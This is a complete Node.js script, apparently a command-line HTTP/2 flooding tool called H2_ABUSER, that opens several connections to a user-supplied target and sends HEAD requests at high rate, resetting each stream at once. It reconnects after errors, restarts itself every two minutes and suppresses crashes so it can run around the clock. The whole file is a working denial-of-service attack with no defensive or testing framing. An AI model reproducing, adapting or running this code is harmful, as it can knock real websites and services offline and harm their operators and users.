const http2 = require('http2');

class H2_ABUSER {
    constructor(target) {
        this.target = target;
        this.host = target.replace('https://', '').replace('http://', '').split('/')[0];
        this.running = true;
        this.reqs = 0;
        this.conns = 3;
        this.streamsPerConn = 100;
        
        // Auto-restart on any failure
        this.restartTimer = null;
        
        this.startNuke();
    }
    
    startNuke() {
        console.log('STARTED');
        
        // Force GC if available
        if (global.gc) {
            setInterval(() => { try { global.gc(); } catch(e) {} }, 30000);
        }
        
        // Create minimal connections
        this.connections = [];
        for (let i = 0; i < this.conns; i++) {
            this.createConn(i);
        }
        
        // Fire streams
        this.fireInterval = setInterval(() => {
            if (!this.running) return;
            
            this.connections.forEach(conn => {
                if (conn && !conn.destroyed) {
                    // Max streams per connection
                    for (let j = 0; j < this.streamsPerConn; j++) {
                        this.sendFireAndForget(conn);
                        this.reqs++;
                    }
                }
            });
            
            // Auto-restart every 2 minutes to prevent issues
            if (this.reqs % 10000 === 0) {
                this.safeRestart();
            }
        }, 10); // 10ms delay
        
        // Auto-restart failsafe
        this.restartTimer = setInterval(() => {
            this.safeRestart();
        }, 120000); // 2 minutes
    }
    
    createConn(id) {
        try {
            const conn = http2.connect(this.target, {
                maxSessionMemory: 16384,
                maxSendHeaderBlockLength: 4096,
                peerMaxConcurrentStreams: 1000
            });
            
            conn.on('error', () => {
                setTimeout(() => this.createConn(id), 1000);
            });
            
            this.connections[id] = conn;
        } catch(e) {
            setTimeout(() => this.createConn(id), 2000);
        }
    }
    
    sendFireAndForget(conn) {
        try {
            const req = conn.request({
                ':method': 'HEAD',
                ':path': '/',
                ':authority': this.host
            });
            req.end();
            req.close();
        } catch(e) {
            // Silent
        }
    }
    
    safeRestart() {
        clearInterval(this.fireInterval);
        clearInterval(this.restartTimer);
        
        this.connections.forEach(conn => {
            try { if (conn) conn.destroy(); } catch(e) {}
        });
        
        setTimeout(() => {
            this.reqs = 0;
            this.startNuke();
        }, 1000);
    }
    
    stop() {
        this.running = false;
        clearInterval(this.fireInterval);
        clearInterval(this.restartTimer);
        this.connections.forEach(conn => {
            try { if (conn) conn.destroy(); } catch(e) {}
        });
    }
}

// 24/7 Runner
process.on('uncaughtException', () => {
    setTimeout(() => main(), 3000);
});

process.on('unhandledRejection', () => {});

function main() {
    if (process.argv.length < 3) {
        console.log('node h2.js https://target.com');
        process.exit(1);
    }
    
    const abuser = new H2_ABUSER(process.argv[2]);
    
    process.on('SIGINT', () => {
        abuser.stop();
        process.exit(0);
    });
}

main();
